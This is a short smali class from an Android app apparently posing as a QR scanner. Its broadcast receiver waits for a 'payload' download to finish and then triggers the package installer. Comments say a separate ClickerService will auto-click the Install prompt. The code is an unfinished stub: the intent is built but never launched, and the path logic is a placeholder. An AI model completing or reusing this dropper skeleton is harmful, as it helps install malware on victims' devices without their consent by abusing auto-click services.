.class public Lcom/android/qr/scanner/DownloadReceiver;
.super Landroid/content/BroadcastReceiver;
.source "DownloadReceiver.java"

# This receiver detects when the payload download is finished and starts installation

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    const-string v0, "android.intent.action.DOWNLOAD_COMPLETE"
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-nez v0, :cond_0
    return-void

    :cond_0
    # Logic to get the downloaded file path and start Intent ACTION_INSTALL_PACKAGE
    # For now, we trigger the system installer
    new-instance v0, Landroid/content/Intent;
    const-string v1, "android.intent.action.VIEW"
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    
    # [Internal path logic would go here]
    # This triggers the "Install" popup which our ClickerService will then auto-click
    return-void
.end method
